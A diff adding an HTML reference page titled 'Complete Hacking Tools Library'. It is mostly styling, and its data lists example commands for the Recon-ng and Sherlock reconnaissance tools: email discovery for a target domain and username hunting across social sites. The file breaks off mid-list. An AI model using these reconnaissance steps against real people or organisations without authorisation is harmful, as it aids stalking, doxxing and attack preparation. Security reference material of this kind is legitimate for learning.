@@ -1,0 +1,2652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Hacking Tools</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body { 
+            font-family: 'Share Tech Mono', monospace; 
+            margin: 0; 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #00ff41;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(0, 255, 65, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 123, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255, 0, 123, 0.05) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        /* Matrix Rain Effect */
+        #matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            opacity: 0.8;
+            overflow: hidden;
+        }
+        
+        .matrix-char {
+            position: absolute;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 18px;
+            opacity: 1;
+            text-shadow: 
+                0 0 5px #00ff41,
+                0 0 10px #00ff41,
+                0 0 15px #00ff41,
+                0 0 20px #00ff41;
+            animation: matrix-fall linear infinite;
+            font-weight: bold;
+        }
+        
+        @keyframes matrix-fall {
+            0% {
+                transform: translateY(-100vh);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh);
+                opacity: 0;
+            }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8) 0%, rgba(26, 26, 46, 0.8) 100%);
+            border-bottom: 2px solid #00ff41;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+            position: relative;
+            overflow: hidden;
+            z-index: 10;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+            animation: scan 3s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        h1 { 
+            color: #00ff41; 
+            text-align: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 3.5em;
+            font-weight: 900;
+            text-shadow: 
+                0 0 10px #00ff41,
+                0 0 20px #00ff41,
+                0 0 30px #00ff41,
+                0 0 40px #00ff41;
+            margin-bottom: 20px;
+            letter-spacing: 3px;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41, 0 0 30px #00ff41; }
+            to { text-shadow: 0 0 20px #00ff41, 0 0 30px #00ff41, 0 0 40px #00ff41, 0 0 50px #00ff41; }
+        }
+        
+        .header p {
+            color: #00d4ff;
+            font-size: 1.2em;
+            text-shadow: 0 0 10px #00d4ff;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        
+        .category { 
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(26, 26, 46, 0.9) 100%);
+            margin: 20px;
+            padding: 25px;
+            border-radius: 15px;
+            border: 2px solid #00ff41;
+            position: relative;
+            z-index: 10;
+            box-shadow: 
+                0 0 20px rgba(0, 255, 65, 0.3),
+                inset 0 0 20px rgba(0, 255, 65, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .category:hover {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 10px 30px rgba(0, 255, 65, 0.4),
+                inset 0 0 30px rgba(0, 255, 65, 0.2);
+            border-color: #00d4ff;
+        }
+        
+        .category::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #00ff41, #00d4ff, #ff0066, #00ff41);
+            animation: borderGlow 2s linear infinite;
+        }
+        
+        @keyframes borderGlow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+        
+        .category h3 { 
+            color: #00d4ff;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px #00d4ff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .tool-count { 
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            color: #000;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .tool { 
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 212, 255, 0.1) 100%);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            transition: all 0.3s ease;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.1em;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tool::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .tool:hover {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2) 0%, rgba(0, 212, 255, 0.2) 100%);
+            border-color: #00ff41;
+            transform: translateX(10px);
+            box-shadow: 
+                0 0 20px rgba(0, 255, 65, 0.4),
+                inset 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+        
+        .tool:hover::before {
+            left: 100%;
+        }
+        
+        .tool:hover {
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        
+        .modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+        }
+        
+        .modal-content { 
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95) 0%, rgba(26, 26, 46, 0.95) 100%);
+            margin: 3% auto; 
+            padding: 30px; 
+            width: 85%; 
+            max-height: 85vh; 
+            overflow-y: auto; 
+            border-radius: 20px;
+            border: 2px solid #00ff41;
+            box-shadow: 
+                0 0 40px rgba(0, 255, 65, 0.5),
+                inset 0 0 40px rgba(0, 255, 65, 0.1);
+            position: relative;
+        }
+        
+        .modal-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00ff41, #00d4ff, #ff0066, #00ff41);
+            animation: borderGlow 3s linear infinite;
+        }
+        
+        .close { 
+            float: right; 
+            font-size: 35px; 
+            cursor: pointer;
+            color: #ff0066;
+            text-shadow: 0 0 15px #ff0066;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .close:hover {
+            color: #ff4080;
+            transform: scale(1.2);
+            text-shadow: 0 0 25px #ff4080;
+        }
+        
+        .command { 
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8) 0%, rgba(26, 26, 46, 0.8) 100%);
+            padding: 20px; 
+            margin: 15px 0; 
+            border-radius: 15px;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .command:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
+            border-color: #00ff41;
+        }
+        
+        .command div {
+            margin-bottom: 10px;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.95em;
+            line-height: 1.4;
+        }
+        
+        .command div:first-child {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #00ff41;
+            border: 2px solid #00ff41;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        
+        .command div:nth-child(2) {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(0, 212, 255, 0.1));
+            color: #00d4ff;
+            border-left: 4px solid #00d4ff;
+            border-radius: 0 10px 10px 0;
+        }
+        
+        .command div:nth-child(3) {
+            background: linear-gradient(135deg, rgba(255, 0, 123, 0.1), rgba(255, 64, 128, 0.1));
+            color: #ff4080;
+            border-left: 4px solid #ff4080;
+            border-radius: 0 10px 10px 0;
+        }
+        
+        .modal h2 {
+            color: #00ff41;
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px #00ff41;
+            text-align: center;
+        }
+        
+        .modal h3 {
+            color: #00d4ff;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8em;
+            margin: 25px 0 15px 0;
+            text-shadow: 0 0 15px #00d4ff;
+        }
+        
+        .modal p {
+            color: #00d4ff;
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        footer {
+            text-align: center; 
+            color: #00d4ff; 
+            padding: 30px; 
+            border-top: 2px solid #00ff41;
+            margin-top: 50px;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8) 0%, rgba(26, 26, 46, 0.8) 100%);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.3), transparent);
+            animation: scanFooter 4s linear infinite;
+        }
+        
+        @keyframes scanFooter {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        footer p {
+            margin: 10px 0;
+            font-size: 1.3em;
+            font-weight: bold;
+            text-shadow: 
+                0 0 10px #00d4ff,
+                0 0 20px #00d4ff,
+                0 0 30px #00d4ff,
+                0 0 40px #00d4ff,
+                0 0 50px #00d4ff;
+            animation: copyrightGlow 2s ease-in-out infinite alternate;
+            position: relative;
+            z-index: 10;
+        }
+        
+        footer p:first-child {
+            color: #00ff41;
+            font-size: 1.5em;
+            text-shadow: 
+                0 0 15px #00ff41,
+                0 0 30px #00ff41,
+                0 0 45px #00ff41,
+                0 0 60px #00ff41,
+                0 0 75px #00ff41;
+            animation: copyrightSuperGlow 1.5s ease-in-out infinite alternate;
+        }
+        
+        footer p:last-child {
+            color: #ff0066;
+            font-size: 1.8em;
+            font-weight: 900;
+            text-shadow: 
+                0 0 20px #ff0066,
+                0 0 40px #ff0066,
+                0 0 60px #ff0066,
+                0 0 80px #ff0066,
+                0 0 100px #ff0066,
+                0 0 120px #ff0066;
+            animation: happyHackingGlow 1.2s ease-in-out infinite alternate;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+        
+        @keyframes happyHackingGlow {
+            from { 
+                text-shadow: 
+                    0 0 20px #ff0066,
+                    0 0 40px #ff0066,
+                    0 0 60px #ff0066,
+                    0 0 80px #ff0066,
+                    0 0 100px #ff0066,
+                    0 0 120px #ff0066;
+                color: #ff0066;
+                transform: scale(1);
+            }
+            to { 
+                text-shadow: 
+                    0 0 30px #ff0066,
+                    0 0 60px #ff0066,
+                    0 0 90px #ff0066,
+                    0 0 120px #ff0066,
+                    0 0 150px #ff0066,
+                    0 0 180px #ff0066;
+                color: #ff4080;
+                transform: scale(1.05);
+            }
+        }
+        
+        @keyframes copyrightGlow {
+            from { 
+                text-shadow: 
+                    0 0 10px #00d4ff,
+                    0 0 20px #00d4ff,
+                    0 0 30px #00d4ff,
+                    0 0 40px #00d4ff,
+                    0 0 50px #00d4ff;
+            }
+            to { 
+                text-shadow: 
+                    0 0 20px #00d4ff,
+                    0 0 40px #00d4ff,
+                    0 0 60px #00d4ff,
+                    0 0 80px #00d4ff,
+                    0 0 100px #00d4ff;
+            }
+        }
+        
+        @keyframes copyrightSuperGlow {
+            from { 
+                text-shadow: 
+                    0 0 15px #00ff41,
+                    0 0 30px #00ff41,
+                    0 0 45px #00ff41,
+                    0 0 60px #00ff41,
+                    0 0 75px #00ff41;
+                color: #00ff41;
+            }
+            to { 
+                text-shadow: 
+                    0 0 25px #00ff41,
+                    0 0 50px #00ff41,
+                    0 0 75px #00ff41,
+                    0 0 100px #00ff41,
+                    0 0 125px #00ff41;
+                color: #00ffff;
+            }
+        }
+        
+        /* Enhanced search bar with fixed icon positioning */
+        .search-box input {
+            width: 100%;
+            padding: 12px 20px 12px 20px;
+            border: 2px solid #00ff41;
+            border-radius: 25px;
+            background: #1a1a2e;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.1em;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .search-icon {
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            color: #00ff41;
+            font-size: 24px;
+            z-index: 10;
+            animation: searchIconGlow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes searchIconGlow {
+            from { 
+                color: #00ff41;
+                text-shadow: 0 0 10px #00ff41;
+            }
+            to { 
+                color: #00ffff;
+                text-shadow: 0 0 20px #00ffff;
+            }
+        }
+        
+        /* Matrix rain effect */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.1;
+        }
+        
+        .matrix-char {
+            position: absolute;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            animation: matrixFall linear infinite;
+        }
+        
+        @keyframes matrixFall {
+            0% { transform: translateY(-100vh); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+        
+        /* Responsive design */
+        @media (max-width: 768px) {
+            h1 { font-size: 2.5em; }
+            .category { margin: 15px; padding: 20px; }
+            .modal-content { width: 95%; margin: 5% auto; }
+        }
+        
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            border-radius: 10px;
+            border: 2px solid rgba(0, 0, 0, 0.3);
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #00d4ff, #00ff41);
+        }
+
+        /* LEGENDARY Search Bar */
+        .search-container {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .search-box {
+            position: relative;
+            width: 60%;
+            max-width: 600px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 12px 40px 12px 20px;
+            border: 2px solid #00ff41;
+            border-radius: 25px;
+            background: #1a1a2e;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.1em;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+            background: #2c3e50;
+        }
+
+        .search-icon {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            color: #00ff41;
+            font-size: 24px;
+            z-index: 10;
+        }
+
+        .search-glow {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(0, 255, 65, 0.3) 0%, transparent 70%);
+            border-radius: 50%;
+            opacity: 0;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: -1;
+            animation: glowPulse 2s infinite;
+        }
+
+        @keyframes glowPulse {
+            0% { opacity: 0; }
+            50% { opacity: 0.7; }
+            100% { opacity: 0; }
+        }
+
+        .search-filters {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .bulk-actions-header {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .bulk-export-btn, .bulk-copy-btn, .stats-btn, .help-btn {
+            background: linear-gradient(135deg, #00ff41 0%, #00d4ff 100%);
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .bulk-export-btn:hover, .bulk-copy-btn:hover, .stats-btn:hover, .help-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.6);
+            background: linear-gradient(135deg, #00d4ff 0%, #00ff41 100%);
+        }
+        
+        .bulk-export-btn::before, .bulk-copy-btn::before, .stats-btn::before, .help-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .bulk-export-btn:hover::before, .bulk-copy-btn:hover::before, .stats-btn:hover::before, .help-btn:hover::before {
+            left: 100%;
+        }
+
+        .filter-btn {
+            padding: 10px 20px;
+            border: 2px solid #00ff41;
+            border-radius: 20px;
+            background: #1a1a2e;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+        }
+
+        .filter-btn:hover {
+            background: #00ff41;
+            color: #000;
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        .filter-btn.active {
+            background: #00ff41;
+            color: #000;
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        /* New styles for tool cards */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .tool-card {
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(26, 26, 46, 0.9) 100%);
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px solid #00ff41;
+            box-shadow: 
+                0 0 20px rgba(0, 255, 65, 0.3),
+                inset 0 0 20px rgba(0, 255, 65, 0.1);
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 10px 30px rgba(0, 255, 65, 0.4),
+                inset 0 0 30px rgba(0, 255, 65, 0.2);
+            border-color: #00d4ff;
+        }
+
+        .tool-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #00ff41, #00d4ff, #ff0066, #00ff41);
+            animation: borderGlow 2s linear infinite;
+        }
+
+        .tool-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .tool-name {
+            color: #00ff41;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.5em;
+            font-weight: 700;
+            text-shadow: 0 0 10px #00ff41;
+            letter-spacing: 1px;
+        }
+
+        .difficulty-badge {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            color: #000;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 0.8em;
+            font-weight: bold;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        .tool-description {
+            color: #00d4ff;
+            font-size: 1em;
+            line-height: 1.4;
+            margin-bottom: 15px;
+            height: 40px; /* Limit height for description */
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .tool-actions {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .copy-btn, .favorite-btn {
+            flex: 1;
+            padding: 8px 15px;
+            border: 2px solid #00ff41;
+            border-radius: 15px;
+            background: #1a1a2e;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.9em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .copy-btn:hover, .favorite-btn:hover {
+            background: #00ff41;
+            color: #000;
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        .copy-btn:active, .favorite-btn:active {
+            transform: scale(0.95);
+        }
+
+        .copy-btn i, .favorite-btn i {
+            margin-right: 5px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #333;
+            color: #fff;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 10000;
+            opacity: 0.9;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .notification.success {
+            background-color: #4CAF50;
+        }
+
+        .notification.error {
+            background-color: #F44336;
+        }
+
+        .notification.info {
+            background-color: #2196F3;
+        }
+        
+        /* Enhanced modal styles */
+        .tool-stats {
+            display: flex;
+            gap: 20px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .stat-item {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(0, 212, 255, 0.1));
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            color: #00d4ff;
+            font-size: 1em;
+        }
+        
+        .command-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .command-number {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            color: #000;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 1.1em;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .copy-command-btn {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            color: #000;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 15px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.9em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .copy-command-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .bulk-actions {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .bulk-copy-btn, .export-btn {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+            color: #000;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 20px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
+        }
+        
+        .bulk-copy-btn:hover, .export-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.6);
+        }
+        
+        .export-btn {
+            background: linear-gradient(135deg, #ff0066, #ff4080);
+        }
+        
+        .export-btn:hover {
+            box-shadow: 0 8px 25px rgba(255, 0, 102, 0.6);
+        }
+        
+        /* Difficulty-specific styling */
+        .tool-card.beginner {
+            border-color: #00ff41;
+        }
+        
+        .tool-card.intermediate {
+            border-color: #00d4ff;
+        }
+        
+        .tool-card.advanced {
+            border-color: #ff0066;
+        }
+        
+        .tool-card.beginner .difficulty-badge {
+            background: linear-gradient(135deg, #00ff41, #00d4ff);
+        }
+        
+        .tool-card.intermediate .difficulty-badge {
+            background: linear-gradient(135deg, #00d4ff, #ff0066);
+        }
+        
+        .tool-card.advanced .difficulty-badge {
+            background: linear-gradient(135deg, #ff0066, #ff4080);
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Rain Background -->
+    <div id="matrix-rain"></div>
+    
+    <div class="header">
+        <h1>🔒 Complete Hacking Tools Library - ALL Tools</h1>
+        <p>Click on any tool to see detailed commands and examples</p>
+        
+        <!-- LEGENDARY Search Bar -->
+        <div class="search-container">
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search for tools, commands, or categories..." />
+                <div class="search-icon">🔍</div>
+                <div class="search-glow"></div>
+            </div>
+            <div class="search-filters">
+                <button class="filter-btn active" data-filter="all">All Tools</button>
+                <button class="filter-btn" data-filter="beginner">Beginner</button>
+                <button class="filter-btn" data-filter="intermediate">Intermediate</button>
+                <button class="filter-btn" data-filter="advanced">Advanced</button>
+            </div>
+        </div>
+        
+        <!-- Bulk Actions -->
+        <div class="bulk-actions-header">
+            <button class="bulk-export-btn" onclick="exportAllTools()">
+                📦 Export All Tools
+            </button>
+            <button class="bulk-copy-btn" onclick="copyAllTools()">
+                📋 Copy All Commands
+            </button>
+            <button class="stats-btn" onclick="showToolStats()">
+                📊 Tool Statistics
+            </button>
+            <button class="help-btn" onclick="showKeyboardShortcutsHelp()" title="Keyboard Shortcuts (Ctrl+Shift+H)">
+                ⌨️ Shortcuts
+            </button>
+        </div>
+    </div>
+
+    <div id="categories"></div>
+
+    <div id="toolModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <div class="matrix-bg" id="matrixBg"></div>
+
+    <script>
+        const toolsData = {
+            "Information Gathering": {
+                "Recon-ng": { 
+                    description: "Full-featured reconnaissance framework", 
+                    commands: [
+                        { command: "recon-ng", explanation: "Launch the Recon-ng framework", result: "Opens interactive Recon-ng shell" },
+                        { command: "modules search google", explanation: "Search for Google-related modules", result: "Lists modules containing 'google'" },
+                        { command: "modules load recon/profiles-profiles/name_to_email", explanation: "Load email discovery module", result: "Module loaded and ready for configuration" },
+                        { command: "info", explanation: "Show module information", result: "Displays module details and options" },
+                        { command: "options set SOURCE company.com", explanation: "Set target company domain", result: "Target domain set to company.com" },
+                        { command: "run", explanation: "Execute the loaded module", result: "Module execution started" },
+                        { command: "show hosts", explanation: "Display discovered hosts", result: "Lists all discovered hosts with details" },
+                        { command: "show domains", explanation: "Display discovered domains", result: "Lists all discovered domains" },
+                        { command: "show contacts", explanation: "Display discovered contacts", result: "Lists all discovered contacts" },
+                        { command: "show credentials", explanation: "Display discovered credentials", result: "Lists all discovered credentials" }
+                    ]
+                },
+                "Sherlock": { 
+                    description: "Hunt down social media accounts by username", 
+                    commands: [
+                        { command: "sherlock john_doe", explanation: "Find all social media accounts for username 'john_doe'", result: "Shows accounts on Twitter, Instagram, Facebook, LinkedIn, GitHub, etc." },
+                        { command: "sherlock admin", explanation: "Search for 'admin' username across all platforms", result: "Finds admin accounts on various social sites and services" },
+                        { command: "sherlock username123", explanation: "Find accounts for 'username123'", result: "Discovers all social media presence for this username" },
+                        { command: "sherlock john_doe --verbose", explanation: "Show detailed search process for 'john_doe'", result: "Displays each platform being checked with results" },
+                        { command: "sherlock admin --output admin_accounts.txt", explanation: "Save found admin accounts to file", result: "Creates admin_accounts.txt with all discovered accounts" },
+                        { command: "sherlock username123 --print-found", explanation: "Only show existing accounts for 'username123'", result: "Filters to show only found social media accounts" },
+                        { command: "sherlock john_doe --timeout 10", explanation: "Search with 10 second timeout per site", result: "Faster scanning with timeout limits" },
+                        { command: "sherlock admin --print-not-found", explanation: "Show platforms where admin username is NOT found", result: "Lists social sites without admin accounts" },
+                        { command: "sherlock username123 --print-errors", explanation: "Show error messages during search", result: "Displays any search errors or failures" },
+                        { command: "sherlock john_doe --print-errors --print-not-found", explanation: "Show errors and not found results", result: "Comprehensive search status information" },
+                        { command: "sherlock admin --output admin_results.txt --format json", explanation: "Save results in JSON format", result: "Exports results in structured JSON format" },
+                        { command: "sherlock username123 --output results.txt --format csv", explanation: "Save results in CSV format", result: "Exports results in spreadsheet-friendly CSV format" },
+                        { command: "sherlock john_doe --output results.txt --format txt", explanation: "Save results in plain text format", result: "Exports results in readable text format" },
+                        { command: "sherlock admin --print-found --output found.txt", explanation: "Save only found accounts to file", result: "Creates file with only discovered accounts" },
+                        { command: "sherlock username123 --print-not-found --output not_found.txt", explanation: "Save not found results to file", result: "Creates file with platforms without accounts" },
+                        { command: "sherlock john_doe --print-errors --output errors.txt", explanation: "Save error messages to file", result: "Creates file with search error details" },
+                        { command: "sherlock admin --timeout 5", explanation: "Use 5 second timeout for faster scanning", result: "Quick scan with aggressive timeout" },
+                        { command: "sherlock username123 --timeout 30", explanation: "Use 30 second timeout for reliable scanning", result: "Reliable scan with generous timeout" },
+                        { command: "sherlock john_doe --max-threads 10", explanation: "Use 10 concurrent threads for scanning", result: "Faster scanning with multiple threads" },
